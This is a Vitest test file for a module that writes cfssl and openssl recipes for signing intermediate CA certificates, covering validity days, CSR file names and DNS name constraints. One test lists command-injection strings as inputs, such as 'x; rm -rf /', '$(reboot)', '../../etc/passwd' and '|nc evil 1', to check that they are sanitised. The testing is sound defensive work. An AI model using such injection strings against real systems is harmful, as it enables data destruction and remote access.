import { describe, expect, it } from 'vitest';
import { csrFileName, DEFAULT_SIGNING_DAYS, maxSigningDays, parseDomains, signingGuide } from './signing';

describe('signingGuide', () => {
  it('builds the cfssl recipe: a profile that forces pathlen 0, and the sign command', () => {
    const g = signingGuide('cfssl', 'Home Services', 365);
    const cfg = JSON.parse(g.files[0]!.content);
    expect(g.files[0]!.name).toBe('ca-config.json');
    expect(cfg.signing.profiles.intermediate).toEqual({
      usages: ['cert sign', 'crl sign'],
      expiry: '8760h',
      ca_constraint: { is_ca: true, max_path_len: 0, max_path_len_zero: true },
    });
    expect(g.command).toContain('cfssl sign -ca root.pem -ca-key root-key.pem -config ca-config.json -profile intermediate home-services.csr');
    expect(g.command).toContain('cfssljson -bare home-services');
    expect(g.resultFile).toBe('home-services.pem');
  });

  it('builds the openssl recipe with pathlen 0 and the days given', () => {
    const g = signingGuide('openssl', 'Home Services', 400);
    expect(g.files[0]!.name).toBe('inter.ext');
    expect(g.files[0]!.content).toContain('basicConstraints = critical, CA:TRUE, pathlen:0');
    expect(g.files[0]!.content).toContain('keyUsage = critical, keyCertSign, cRLSign');
    expect(g.command).toContain('-days 400');
    expect(g.command).toContain('-in home-services.csr');
    expect(g.command).toContain('-out home-services.crt');
    expect(g.resultFile).toBe('home-services.crt');
  });

  it('falls back to the default validity for nonsense days', () => {
    for (const bad of [0, -5, 1.5, NaN]) {
      expect(signingGuide('openssl', 'x', bad).command).toContain(`-days ${DEFAULT_SIGNING_DAYS}`);
    }
  });

  it('lets nothing but a safe file name from the request name reach the commands', () => {
    for (const name of ['x; rm -rf /', '$(reboot)', '`id`', 'a\nb', "it's", '../../etc/passwd', '|nc evil 1']) {
      for (const s of ['cfssl', 'openssl'] as const) {
        const g = signingGuide(s, name);
        const benign = signingGuide(s, 'benign');
        const stem = csrFileName(name).replace(/\.csr$/, '');
        expect(stem, name).toMatch(/^[a-z0-9][a-z0-9._-]*$/);
        // Replacing each stem with a placeholder must leave identical command text.
        expect(g.command.replaceAll(stem, 'STEM'), `${s} / ${name}`).toBe(benign.command.replaceAll('benign', 'STEM'));
      }
    }
  });
});

describe('maxSigningDays', () => {
  const now = new Date('2026-10-20T12:00:00Z');
  it('is the default when the Root lasts long enough', () => {
    expect(maxSigningDays('2036-10-20T12:00:00Z', now)).toBe(DEFAULT_SIGNING_DAYS);
  });
  it('stops a day short of the Root ending', () => {
    expect(maxSigningDays('2026-11-20T12:00:00Z', now)).toBe(30); // 31 days left
  });
  it('never goes below one day, even for a Root about to expire or already expired', () => {
    expect(maxSigningDays('2026-10-21T12:00:00Z', now)).toBe(1);
    expect(maxSigningDays('2020-01-01T00:00:00Z', now)).toBe(1);
  });
  it('tolerates a bad date', () => expect(maxSigningDays('not a date', now)).toBe(DEFAULT_SIGNING_DAYS));
});

describe('csrFileName', () => {
  it('names the request file safely', () => expect(csrFileName('Casa Serviços')).toBe('casa-servicos.csr'));
});

describe('name constraints', () => {
  it('parses domains from lines, commas and spaces, dropping wildcards and duplicates', () => {
    expect(parseDomains('Lab, *.mattegroup.example\n.lab  lab')).toEqual({ domains: ['lab', 'mattegroup.example'], invalid: [] });
  });
  it('reports anything that is not a plain DNS name', () => {
    const r = parseDomains('ok.lab x/y $(id) a_b.lab -bad.lab');
    expect(r.domains).toEqual(['ok.lab']);
    expect(r.invalid).toEqual(['x/y', '$(id)', 'a_b.lab', '-bad.lab']);
  });
  it('writes a critical nameConstraints line in the openssl recipe, and none without domains', () => {
    const g = signingGuide('openssl', 'x', 365, undefined, ['lab', 'mattegroup.example']);
    expect(g.files[0]!.content).toContain('nameConstraints = critical, permitted;DNS:lab, permitted;DNS:mattegroup.example');
    expect(signingGuide('openssl', 'x', 365).files[0]!.content).not.toContain('nameConstraints');
  });
  it('never lets an unsafe domain into the recipe, even when passed directly', () => {
    const g = signingGuide('openssl', 'x', 365, undefined, ['lab', 'a\nb', '$(id)']);
    expect(g.files[0]!.content).toContain('permitted;DNS:lab');
    expect(g.files[0]!.content).not.toMatch(/\$\(id\)|a\nb/);
  });
  it('says cfssl cannot apply them instead of giving a recipe that would silently omit them', () => {
    const g = signingGuide('cfssl', 'x', 365, undefined, ['lab']);
    expect(g.unsupported).toBe(true);
    expect(g.command).toBe('');
    expect(signingGuide('cfssl', 'x', 365).unsupported).toBeUndefined();
  });
});
